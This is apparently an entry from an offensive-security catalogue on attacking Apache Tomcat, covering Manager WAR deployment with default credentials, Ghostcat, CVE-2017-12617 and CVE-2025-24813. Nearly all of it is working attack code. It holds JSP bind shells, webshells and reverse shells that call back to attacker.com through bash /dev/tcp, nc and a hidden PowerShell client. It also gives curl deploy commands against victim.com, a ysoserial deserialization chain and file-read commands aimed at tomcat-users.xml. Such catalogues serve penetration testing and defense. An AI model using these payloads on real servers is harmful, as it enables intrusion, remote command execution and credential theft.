---
comment: |
  Apache Tomcat's Manager application (`/manager/html`) allows authenticated users with the
  `manager-gui` role to deploy WAR (Web Application Archive) files. A WAR containing a malicious
  JSP file is extracted and served by Tomcat, making any JSP payload directly accessible over HTTP.

  The Manager API endpoint (`/manager/text/deploy`) accepts the same WAR via HTTP PUT, enabling
  automated deployment without a browser. Default credentials (`tomcat:tomcat`, `admin:admin`,
  `tomcat:s3cr3t`) are commonly left unchanged in misconfigured deployments.

  CVE-2020-1938 "Ghostcat" (CVSS 9.8, CISA KEV): The AJP connector (default port 8009, enabled
  by default in Tomcat < 9.0.31) allows unauthenticated reading of arbitrary files from the
  Tomcat webroot and web application classpath, including WEB-INF/web.xml and JSP source files.
  If file upload is possible, Ghostcat can be chained into RCE by including the uploaded file.

  CVE-2025-24813 (CVSS 9.8, Feb 2025): Partial PUT support (enabled by default) writes incomplete
  uploads as temp files with predictable names. Combined with Tomcat's FileStore session
  persistence, a malicious serialized Java object uploaded via partial PUT can be deserialized
  by requesting a session using the temp filename as the session ID.
docker:
  compose: "services:\n  tomcat:\n    image: tomcat:9.0.30-jdk11\n    ports:\n   \
    \   - \"8080:8080\"\n      - \"8009:8009\"\n"
  note: "Starts Tomcat 9.0.30 (vulnerable to CVE-2020-1938 Ghostcat) with the AJP\
    \ connector\nexposed on port 8009. Access at `http://localhost:8080`.\nThe Ghostcat\
    \ file-read requires no credentials \u2014 point `ajpShooter.py` at `localhost:8009`.\n\
    To enable Manager-based WAR deployment, add credentials after the container starts:\n\
    `docker compose exec tomcat bash -c 'echo \"<tomcat-users><user username=\\\"\
    tomcat\\\" password=\\\"tomcat\\\" roles=\\\"manager-gui,manager-script\\\"/></tomcat-users>\"\
    \ > conf/tomcat-users.xml'`\nThen restart the container: `docker compose restart\
    \ tomcat`\n"
functions:
  bind-shell:
  - code: |
      <%@ page import="java.io.*,java.net.*" %>
      <%
      // Deploy this JSP as part of a WAR via Tomcat Manager, then request it to activate.
      // The page blocks until the client disconnects; the HTTP response does not complete.
      ServerSocket ss = new ServerSocket(12345);
      Socket c = ss.accept();
      Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
      InputStream pi = p.getInputStream(), si = c.getInputStream();
      OutputStream po = p.getOutputStream(), so = c.getOutputStream();
      while (!c.isClosed()) {
          while (pi.available() > 0) so.write(pi.read());
          while (si.available() > 0) po.write(si.read());
          so.flush(); po.flush(); Thread.sleep(50);
      }
      p.destroy(); c.close(); ss.close();
      %>
    comment: |
      Opens a bind shell on TCP 12345 via a deployed WAR/JSP using a ServerSocket bridge.
      The JSP page blocks the HTTP request thread until the client disconnects.
      Deploy via Tomcat Manager:
        jar -cf bind.war bind.jsp && curl -u tomcat:tomcat \
          "http://victim.com:8080/manager/text/deploy?path=/bind" --upload-file bind.war
      Trigger by requesting: http://victim.com:8080/bind/bind.jsp
      Connect with: nc victim.com 12345
    connector: tcp-client
    contexts:
      admin:
    platform: linux
    tty: false
  - code: "<%@ page import=\"java.io.*,java.net.*\" %>\n<%\n// Windows variant \u2014\
      \ replaces /bin/sh with cmd.exe\nServerSocket ss = new ServerSocket(12345);\n\
      Socket c = ss.accept();\nProcess p = new ProcessBuilder(\"cmd.exe\").redirectErrorStream(true).start();\n\
      InputStream pi = p.getInputStream(), si = c.getInputStream();\nOutputStream\
      \ po = p.getOutputStream(), so = c.getOutputStream();\nwhile (!c.isClosed())\
      \ {\n    while (pi.available() > 0) so.write(pi.read());\n    while (si.available()\
      \ > 0) po.write(si.read());\n    so.flush(); po.flush(); Thread.sleep(50);\n\
      }\np.destroy(); c.close(); ss.close();\n%>\n"
    comment: "Windows variant \u2014 identical ServerSocket bridge but spawns cmd.exe\
      \ instead of /bin/sh.\nDeploy and trigger identically to the Linux variant.\n\
      Connect with: nc victim.com 12345\n"
    connector: tcp-client
    contexts:
      admin:
    platform: windows
    tty: false
  file-read:
  - code: |
      # Using the public Ghostcat PoC (github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi):
      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/web.xml read

      # Read the application's compiled class configuration (may contain hardcoded credentials):
      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/classes/application.properties read

      # Read files outside the webapp (path traversal via AJP attributes):
      python3 ajpShooter.py http://victim.com:8080 8009 /WEB-INF/../conf/tomcat-users.xml read
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2020-1938\
      \ \"Ghostcat\": Tomcat's AJP connector allows setting the\n`javax.servlet.include.request_uri`\
      \ and related AJP attributes, which control which file\nthe DefaultServlet includes\
      \ in the response. This bypasses access controls on WEB-INF/\nand allows reading\
      \ any file under the webapp root unauthenticated.\n\nThe AJP port (8009) must\
      \ be reachable \u2014 it is often exposed internally even when 8080/443\nis\
      \ firewalled. Disabled by default since Tomcat 9.0.31, 8.5.51, 7.0.100.\n\n\
      github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \u2014 Python PoC\nnuclei:\
      \ CVE-2020-1938\n"
    contexts:
      unauthenticated:
    version: |-
      < 9.0.31 / < 8.5.51 / < 7.0.100
  file-write:
  - code: |
      # CVE-2017-12617: HTTP PUT to DefaultServlet writes arbitrary files when readonly=false
      # Bypass readonly check with a trailing slash (Tomcat strips it before writing the file)
      curl -X PUT "http://victim.com:8080/shell.jsp/" \
        --data '<%@ page import="java.io.*"%><%String c=request.getParameter("c");if(c!=null){String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'

      # Access the deployed shell:
      curl "http://victim.com:8080/shell.jsp?c=id"
    comment: "CVE-2017-12617: When the DefaultServlet has `readonly` set to `false`\
      \ in web.xml\n(a non-default configuration), HTTP PUT requests write files directly\
      \ to the webroot.\nThe trailing slash bypass works because Tomcat normalises\
      \ the path after the write check.\n\nPrerequisites: `readonly=false` in conf/web.xml\
      \ DefaultServlet init-param (non-default).\nCheck with: OPTIONS http://victim.com:8080/\
      \ \u2014 a `DAV` or `Allow: PUT` header confirms.\n\nAlternative without CVE\
      \ (requires manager-gui role): deploy a WAR via the Manager API\nthat contains\
      \ the target file \u2014 this is the primary documented path for admin access.\n"
    contexts:
      admin:
    version: |-
      9.0.0.M1 - 9.0.1 / 8.5.0 - 8.5.22 / 8.0.0.RC1 - 8.0.46 / 7.0.0 - 7.0.81
  rce:
  - blind: true
    code: "# Step 1: generate a serialized Java payload (requires ysoserial + a gadget\
      \ on target classpath)\n# Common gadgets: CommonsCollections2 (CC2), Spring1,\
      \ Groovy1\njava -jar ysoserial.jar CommonsCollections2 'id > /tmp/pwned' > payload.ser\n\
      \n# Step 2: upload via partial PUT \u2014 Tomcat stores it as a temp session\
      \ file\nFILESIZE=$(wc -c < payload.ser | tr -d ' ')\ncurl -s -X PUT \"http://victim.com:8080/exploit.session\"\
      \ \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -H \"Content-Range:\
      \ bytes 0-$((FILESIZE - 1))/$((FILESIZE + 1))\" \\\n  --data-binary @payload.ser\n\
      \n# Step 3: trigger deserialization \u2014 JSESSIONID maps to the session filename\n\
      curl -s \"http://victim.com:8080/\" \\\n  -H \"Cookie: JSESSIONID=exploit\"\n"
    comment: "CVE-2025-24813 (CVSS 9.8): Tomcat's partial PUT support writes uploaded\
      \ data as a temp\nfile in the session storage directory. When FileStore-based\
      \ session persistence is\nconfigured, a request with a JSESSIONID matching the\
      \ temp filename causes Tomcat to\ndeserialize the file \u2014 executing any\
      \ gadget chain embedded in the payload.\n\nPrerequisites:\n- Partial PUT enabled\
      \ (on by default in affected versions \u2014 no config change required)\n- FileStore\
      \ session persistence configured (non-default; check context.xml for\n    <Manager\
      \ className=\"org.apache.catalina.session.FileStore\"/>)\n- A deserialization\
      \ gadget chain present on the classpath (CommonsCollections,\n  Spring Framework,\
      \ Groovy, etc.) \u2014 enumerate with github.com/frohoff/ysoserial\n\nExploitation\
      \ is blind: write output to a file (/tmp/pwned) or use the reverse-shell\nentry\
      \ for interactive access. Actively exploited in the wild as of Feb 2025.\n\n\
      PoC: github.com/absholi7ly/POC-CVE-2025-24813\nnuclei: CVE-2025-24813\n"
    contexts:
      unauthenticated:
    version: |-
      9.0.0-M1 - 9.0.98 / 10.1.0-M1 - 10.1.34 / 11.0.0-M1 - 11.0.2
  - code: |
      <%@ page import="java.io.*" %>
      <%
      String[] cmd = {"/bin/sh", "-c", request.getParameter("cmd")};
      Process proc = Runtime.getRuntime().exec(cmd);
      BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
      StringBuilder sb = new StringBuilder();
      String line;
      while ((line = br.readLine()) != null) sb.append(line).append("\n");
      out.print("<pre>" + sb.toString() + "</pre>");
      %>
    comment: |
      Deploy a WAR containing this JSP file via the Tomcat Manager. The `cmd` GET parameter
      is passed to `/bin/sh -c`, supporting pipes, redirects, and complex commands.
      Access at: http://victim.com:8080/<app-name>/shell.jsp?cmd=id

      Build the WAR: mkdir shell && cp shell.jsp shell/ && jar -cf shell.war -C shell .
      Deploy:  curl -u tomcat:tomcat "http://victim.com:8080/manager/text/deploy?path=/shell" \
                    --upload-file shell.war
    contexts:
      admin:
    platform: linux
  - code: |
      <%@ page import="java.io.*" %>
      <%
      String[] cmd = {"cmd.exe", "/c", request.getParameter("cmd")};
      Process proc = Runtime.getRuntime().exec(cmd);
      BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
      StringBuilder sb = new StringBuilder();
      String line;
      while ((line = br.readLine()) != null) sb.append(line).append("\n");
      out.print("<pre>" + sb.toString() + "</pre>");
      %>
    comment: "Windows variant \u2014 replaces `/bin/sh -c` with `cmd.exe /c`. Supports\
      \ pipes, redirects,\nand complex commands via cmd.exe. Deploy and trigger identically\
      \ to the Linux variant.\nAccess at: http://victim.com:8080/<app-name>/shell.jsp?cmd=whoami\n"
    contexts:
      admin:
    platform: windows
  reverse-shell:
  - blind: true
    code: |
      <%@ page import="java.io.*" %>
      <%
      String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.com/12345 0>&1"};
      Runtime.getRuntime().exec(cmd);
      %>
    comment: "Deploy a WAR containing this JSP file, then trigger the payload by requesting\
      \ the JSP page.\nThe reverse shell connects back to attacker.com:12345 using\
      \ bash's /dev/tcp built-in.\nRequires a bash binary on the target \u2014 use\
      \ `/bin/sh -c \"nc attacker.com 12345 -e /bin/sh\"`\nas an alternative if bash\
      \ is unavailable.\nThe HTTP response returns immediately (exec is fire-and-forget);\
      \ check the listener.\n"
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
  - blind: true
    code: |
      <%@ page import="java.io.*" %>
      <%
      String ps = '$c=New-Object Net.Sockets.TCPClient("attacker.com",12345);' +
          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){' +
          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
          '$sb=(iex $d 2>&1|Out-String);' +
          '$r=[Text.Encoding]::ASCII.GetBytes($sb+"PS "+(pwd).Path+"> ");' +
          '$s.Write($r,0,$r.Length);$s.Flush()}';
      String[] cmd = {"powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps};
      Runtime.getRuntime().exec(cmd);
      %>
    comment: "Windows variant \u2014 spawns a PowerShell interactive reverse shell\
      \ via JSP. Deploy the same\nway as the Linux variant. PowerShell connects to\
      \ attacker.com:12345 and returns command\noutput prefixed with the current working\
      \ directory prompt.\nThe HTTP response returns immediately (exec is fire-and-forget);\
      \ check the listener.\n"
    contexts:
      admin:
    listener: tcp-server
    platform: windows
    tty: false
  webshell:
  - code: |
      <%@ page import="java.io.*" %>
      <%
      String c = request.getParameter("c");
      if (c != null) {
          String[] cmd = {"/bin/sh", "-c", c};
          Process p = Runtime.getRuntime().exec(cmd);
          out.print(new String(p.getInputStream().readAllBytes()));
      }
      %>
    comment: |
      Minimal JSP webshell deployed as part of a WAR file. The `c` parameter accepts arbitrary
      OS commands (including pipes and redirects) passed via `/bin/sh -c`.
      Deploy via Tomcat Manager and access at:
      http://victim.com:8080/<app-name>/ws.jsp?c=id
    contexts:
      admin:
    platform: linux
  - code: |
      <%@ page import="java.io.*" %>
      <%
      String c = request.getParameter("c");
      if (c != null) {
          String[] cmd = {"cmd.exe", "/c", c};
          Process p = Runtime.getRuntime().exec(cmd);
          out.print(new String(p.getInputStream().readAllBytes()));
      }
      %>
    comment: "Windows variant \u2014 replaces `/bin/sh -c` with `cmd.exe /c`. Accepts\
      \ arbitrary Windows\ncommands including pipes and redirects. Deploy via Tomcat\
      \ Manager and access at:\nhttp://victim.com:8080/<app-name>/ws.jsp?c=whoami\n"
    contexts:
      admin:
    platform: windows
